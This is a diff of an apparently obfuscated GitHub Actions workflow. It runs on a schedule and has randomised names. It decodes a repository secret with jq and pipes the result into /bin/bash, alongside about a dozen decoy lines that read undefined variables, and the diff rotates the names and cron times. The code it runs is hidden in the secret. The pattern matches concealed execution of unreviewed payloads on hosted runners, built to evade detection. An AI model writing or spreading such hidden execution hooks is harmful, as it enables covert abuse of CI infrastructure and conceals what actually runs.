@@ -3,23 +3,27 @@ name: xiezijian7654
 on:
   workflow_dispatch:
   schedule:
-    - cron: '14 4/6 * * *'
+    - cron: '42 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: xiezijian7654
         env:
-          ncno57130: ${{ secrets.ncno57130 }}
+          snxf806: ${{ secrets.snxf806 }}
         run: |
-          echo $ncno57130 | jq -r .gy90235 | /bin/bash
-          echo $fnuam044 | jq -r .pufo98464 | /bin/bash
-          echo $u41 | jq -r .fr3 | /bin/bash
-          echo $puzau770 | jq -r .fbw514 | /bin/bash
-          echo $hg800 | jq -r .zqx551 | /bin/bash
-          echo $oaqh0117 | jq -r .uum3393 | /bin/bash
-          echo $x9 | jq -r .jtn45 | /bin/bash
-          echo $igtn0 | jq -r .kf4112 | /bin/bash
+          echo $snxf806 | jq -r .k5 | /bin/bash
+          echo $qtz242 | jq -r .hqm90452 | /bin/bash
+          echo $xows3 | jq -r .pcma58393 | /bin/bash
+          echo $xbog629 | jq -r .dkd291 | /bin/bash
+          echo $pestr1930 | jq -r .tvag22891 | /bin/bash
+          echo $u667 | jq -r .n6716 | /bin/bash
+          echo $fnr6 | jq -r .xi0856 | /bin/bash
+          echo $x260 | jq -r .kdgn9193 | /bin/bash
+          echo $laniu44 | jq -r .jbpff9242 | /bin/bash
+          echo $g6 | jq -r .flrnc87074 | /bin/bash
+          echo $oxdy35 | jq -r .zivdy2 | /bin/bash
+          echo $jev78 | jq -r .uamr170 | /bin/bash
+          echo $kh40992 | jq -r .bg5682 | /bin/bash
 
